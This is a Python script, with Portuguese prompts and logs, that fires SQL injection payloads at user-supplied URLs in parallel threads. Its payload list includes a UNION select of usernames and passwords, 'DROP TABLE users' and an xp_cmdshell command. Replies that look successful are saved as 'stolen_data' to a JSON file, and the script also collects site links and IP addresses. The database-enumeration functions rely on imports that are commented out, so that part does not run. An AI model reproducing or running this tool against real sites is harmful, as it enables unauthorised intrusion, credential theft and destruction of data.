import requests
import json
import logging
import re
import threading
import time
import socket
from bs4 import BeautifulSoup
#import mysql.connector
#import psycopg2

logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

class AggressiveSQLInjectionTester:
    def __init__(self):
        self.target_urls = []
        self.payloads = [
            "' OR '1'='1'; --",
            "' UNION SELECT username, password FROM users; --",
            "' OR 'a'='a'; --",
            "' AND (SELECT COUNT(*) FROM users) > 0; --",
            "'; DROP TABLE users; --",
            "'; EXEC xp_cmdshell('whoami'); --",
            "'; SELECT * FROM information_schema.tables; --",
            "'; SELECT * FROM users; --"
        ]
        self.stolen_data = []
        self.session = requests.Session()
        self.lock = threading.Lock()

    def collect_urls(self):
        urls_input = input("Digite as URLs para testar, separadas por vírgula: ")
        self.target_urls = [url.strip() for url in urls_input.split(',')]
        logging.info(f"URLs coletadas: {self.target_urls}")

        for url in self.target_urls:
            auth_required = input(f"A autenticação é necessária para {url}? (s/n): ").strip().lower()
            if auth_required == 's':
                self.authenticate(url)

    def authenticate(self, url):
        username = input("Digite o nome de usuário: ")
        password = input("Digite a senha: ")

        login_url = f"{url}/login"
        payload = {
            'username': username,
            'password': password
        }

        try:
            response = self.session.post(login_url, data=payload)
            if "login successful" in response.text.lower():
                logging.info(f"Autenticação bem-sucedida para {url}")
            else:
                logging.warning(f"Falha na autenticação para {url}")
        except requests.exceptions.RequestException as e:
            logging.error(f"Erro na requisição de autenticação: {e}")

    def send_message(self, url, message):
        message_url = f"{url}/send_message"
        payload = {'message': message}

        try:
            response = self.session.post(message_url, data=payload)
            logging.info(f"Mensagem enviada para {url}: {message} - Status: {response.status_code}")
            return response.text
        except requests.exceptions.RequestException as e:
            logging.error(f"Erro ao enviar mensagem: {e}")

    def display_message(self, url, message):
        display_url = f"{url}/display_message"
        payload = {'message': message}

        try:
            response = self.session.post(display_url, data=payload)
            logging.info(f"Mensagem exibida na tela do site: {message} - Status: {response.status_code}")
            return response.text
        except requests.exceptions.RequestException as e:
            logging.error(f"Erro ao exibir mensagem: {e}")

    def execute_injections(self, thread_count=5):
        threads = []
        for url in self.target_urls:
            for payload in self.payloads:
                thread = threading.Thread(target=self.execute_injection, args=(url, payload))
                threads.append(thread)
                thread.start()
                time.sleep(0.1)

        for thread in threads:
            thread.join()

        self.save_data()

    def execute_injection(self, url, payload):
        params = {
            'id': payload,
            'page': payload,
            'user': payload,
            'data': payload
        }

        for param, value in params.items():
            try:
                response = self.session.get(url, params={param: value})
                logging.debug(f"Testando payload: {value} na URL: {url} com parâmetro: {param} - Status: {response.status_code}")
                if self.process_response(response):
                    with self.lock:
                        self.stolen_data.append({
                            'url': url,
                            'payload': value,
                            'response': response.text,
                            'status_code': response.status_code,
                            'headers': dict(response.headers)
                        })
            except requests.exceptions.RequestException as e:
                logging.error(f"Erro na requisição: {e}")

    def process_response(self, response):
        if "error" in response.text.lower() or "syntax" in response.text.lower():
            logging.info("Potencial vulnerabilidade detectada na resposta.")
            return True
        elif re.search(r'Welcome|You are logged in|User|password|Database', response.text):
            logging.info("Injeção bem-sucedida!")
            return True
        return False

    def collect_info(self, url):
        try:
            response = self.session.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')

            title = soup.title.string if soup.title else 'Sem título'
            headers = dict(response.headers)
            status_code = response.status_code
            links = [a['href'] for a in soup.find_all('a', href=True)]
            domain = url.split("//")[-1].split("/")[0]
            ip_address = socket.gethostbyname(domain)

            logging.info(f"Coletadas informações de {url}:")
            logging.info(f"Título: {title}")
            logging.info(f"Código de Status: {status_code}")
            logging.info(f"Links encontrados: {links}")
            logging.info(f"Domínio: {domain}")
            logging.info(f"Endereço IP: {ip_address}")

            return {
                'url': url,
                'title': title,
                'status_code': status_code,
                'headers': headers,
                'links': links,
                'domain': domain,
                'ip_address': ip_address
            }
        except requests.exceptions.RequestException as e:
            logging.error(f"Erro ao coletar informações de {url}: {e}")
            return None
        except socket.gaierror as e:
            logging.error(f"Erro ao resolver o endereço IP para {url}: {e}")
            return None

    def get_database_info(self, db_type, host, user, password, db_name):
        if db_type == 'mysql':
            try:
                connection = mysql.connector.connect(
                    host=host,
                    user=user,
                    password=password,
                    database=db_name
                )
                cursor = connection.cursor()
                cursor.execute("SELECT COUNT(*) FROM information_schema.tables;")
                table_count = cursor.fetchone()[0]
                logging.info(f"Número de tabelas no banco de dados: {table_count}")

                cursor.execute("SELECT COUNT(*) FROM information_schema.columns WHERE table_schema = %s;", (db_name,))
                column_count = cursor.fetchone()[0]
                logging.info(f"Número de colunas no banco de dados: {column_count}")

                cursor.execute("SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = %s;", (db_name,))
                data_count = cursor.fetchone()[0]
                logging.info(f"Número de trocas de informações: {data_count}")

                cursor.close()
                connection.close()
            except mysql.connector.Error as e:
                logging.error(f"Erro ao conectar ao banco de dados MySQL: {e}")
        elif db_type == 'postgresql':
            try:
                connection = psycopg2.connect(
                    host=host,
                    user=user,
                    password=password,
                    dbname=db_name
                )
                cursor = connection.cursor()
                cursor.execute("SELECT COUNT(*) FROM information_schema.tables;")
                table_count = cursor.fetchone()[0]
                logging.info(f"Número de tabelas no banco de dados: {table_count}")

                cursor.execute("SELECT COUNT(*) FROM information_schema.columns WHERE table_catalog = %s;", (db_name,))
                column_count = cursor.fetchone()[0]
                logging.info(f"Número de colunas no banco de dados: {column_count}")

                cursor.execute("SELECT COUNT(*) FROM pg_stat_activity;")
                connection_count = cursor.fetchone()[0]
                logging.info(f"Número de conexões ativas: {connection_count}")

                cursor.close()
                connection.close()
            except psycopg2.Error as e:
                logging.error(f"Erro ao conectar ao banco de dados PostgreSQL: {e}")

    def save_data(self):
        with open('stolen_data.json', 'w') as json_file:
            json.dump(self.stolen_data, json_file, indent=4)
            logging.info("Dados armazenados em 'stolen_data.json'.")

    def generate_report(self):
        report = {
            'total_urls': len(self.target_urls),
            'successful_injections': sum(1 for data in self.stolen_data if 'payload' in data),
            'failed_injections': len(self.payloads) * len(self.target_urls) - sum(1 for data in self.stolen_data)
        }
        logging.info(f"Relatório gerado: {report}")